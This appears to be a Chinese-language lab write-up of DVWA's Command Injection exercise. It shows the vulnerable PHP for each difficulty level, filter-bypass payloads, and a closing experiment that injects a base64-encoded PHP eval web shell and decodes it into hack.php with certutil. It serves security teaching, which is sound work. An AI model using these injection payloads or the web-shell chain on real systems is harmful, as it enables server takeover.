---
layout: post
title: "DVWA Command Injection (教學用)"
description: ""
date: 2023-07-11
categories:
  - DVWA
  - DVWA_CMD_Injection
author: ""
tags: ['DVWA', 'CMD_Injection']
---



# DVWA  Command Injection (教學用)
###### tags: `DVWA`

## low




輸入IP  127.0.0.1
```htmlembedded
<form name="ping" action="#" method="post">
    <p>
        Enter an IP address:
        <input type="text" name="ip" size="30">
        <input type="submit" name="Submit" value="Submit">
    </p>
</form>
```


返回
```cmd
Pinging 127.0.0.1 with 32 bytes of data:
Reply from 127.0.0.1: bytes=32 time<1ms TTL=128
Reply from 127.0.0.1: bytes=32 time<1ms TTL=128
Reply from 127.0.0.1: bytes=32 time<1ms TTL=128
Reply from 127.0.0.1: bytes=32 time<1ms TTL=128

Ping statistics for 127.0.0.1:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms
```



大概猜測一下:

```php
<?php
$output = shell_exec("ping {$_GET['ip']}");
echo "<pre>$output</pre>";
?>
```



* &&
cmd1 成功後執行 cmd2
cmd1 失敗後不執行 cmd2
```cmd=
127.0.0.1 && echo 123
x && echo 123
```
<br/>
<br/>

* &
cmd1 不管失敗或成功都執行 cmd2

```cmd=
127.0.0.1 & echo 123
x & echo 123
```
<br/>
<br/>

* ||
cmd1 成功後不執行 cmd2
cmd1 失敗後執行 cmd2

```cmd=
127.0.0.1 || echo 123
x || echo 123
```
<br/>
<br/>



* | (管道符)
cmd1 的 stdout 作為 cmd2 的輸入
```cmd=

//dir 會顯示出當前目錄所有檔案 
// find 找出.txt 的字串
dir | find ".txt"


//netstat -ano 列出所有連線
//find "127.0.0.1" 找出 127.0.0.1的連線

netstat -ano | find "127.0.0.1"
```

* payload 組合
```
x & dir | find ".txt"
```


* 如果出現亂碼
```
x & chcp

Ping request could not find host x. Please check the name and try again.
Active code page: 932

```
code page 查詢
https://learn.microsoft.com/en-us/windows/win32/intl/code-page-identifiers

932	 = shift_jis


下載網頁插件 
* 關鍵字 charset 

我用的 chrome 插件 
* 网页编码修改（Charset）。

<br/>
<br/>




### code:

跟我猜測的差不多。
```php

<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?>
```






## medium


直接看code 懶得猜了

```php

<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Set blacklist
    $substitutions = array(
        '&&' => '',
        ';'  => '',
    );

    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?>
```

只針對 && 和 ;做過濾，所以其他還是可以用的

我們這次就來針對本題的繞過:

這種字串型的很好繞過
```
&;& 
//; 轉為空

又變成

&&

```

payload
```
127.0.0.1 &;&  echo 123
```










## high


```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = trim($_REQUEST[ 'ip' ]);

    // Set blacklist
    $substitutions = array(
        '&'  => '',
        ';'  => '',
        '| ' => '',   //關鍵點
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
        '||' => '',   // 關鍵點
    );

    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}

?>
```



一樣是 || 字串，這種字串型給了我們繞過的機會。


payload
```
x |;| echo 123
```


另一個(不過太假了，多一個空格)
```
'| ' => '',
```

只要 | 的右邊不要有空個就好，
雖說 | 作為管道符，但是如果 cmd2 不需要 cmd1的stdout做為輸入也不會有任何問題

payload:
```
127.0.0.1 |echo 123
```





## impossible

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $target = $_REQUEST[ 'ip' ];
    $target = stripslashes( $target );

    // Split the IP into 4 octects
    $octet = explode( ".", $target );


    // Check IF each octet is an integer
    if( ( is_numeric( $octet[0] ) ) && ( is_numeric( $octet[1] ) ) && ( is_numeric( $octet[2] ) ) && ( is_numeric( $octet[3] ) ) && ( sizeof( $octet ) == 4 ) ) {
        // If all 4 octets are int's put the IP back together.
        $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];

        // Determine OS and execute the ping command.
        if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
            // Windows
            $cmd = shell_exec( 'ping  ' . $target );
        }
        else {
            // *nix
            $cmd = shell_exec( 'ping  -c 4 ' . $target );
        }

        // Feedback for the end user
        echo "<pre>{$cmd}</pre>";
    }
    else {
        // Ops. Let the user name theres a mistake
        echo '<pre>ERROR: You have entered an invalid IP.</pre>';
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?>
```

防預原理:

127.0.0.1 各別拆開

127 (判斷是否為數字)
0   (判斷是否為數字)
0   (判斷是否為數字)
1   (判斷是否為數字)




### cheetsheet 指出

* 在 PHP 中使用escapeshellarg()或escapeshellcmd()而不是exec()、system()、passthru()。
https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html







* 自動化測試 payload:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/Intruder/command_exec.txt



## 實驗:

調到medium


```
一句話木馬
<?php @eval($_POST[x]); ?>



轉base64
PD9waHAgQGV2YWwoJF9QT1NUW3hdKTsgPz4=


輸出text.txt
x & echo PD9waHAgQGV2YWwoJF9QT1NUW3hdKTsgPz4= >text.txt



decode 到 hack.php
x & certutil -decode text.txt hack.php


```


high 難度 字元(-)  被過濾了。需要使用其他方法。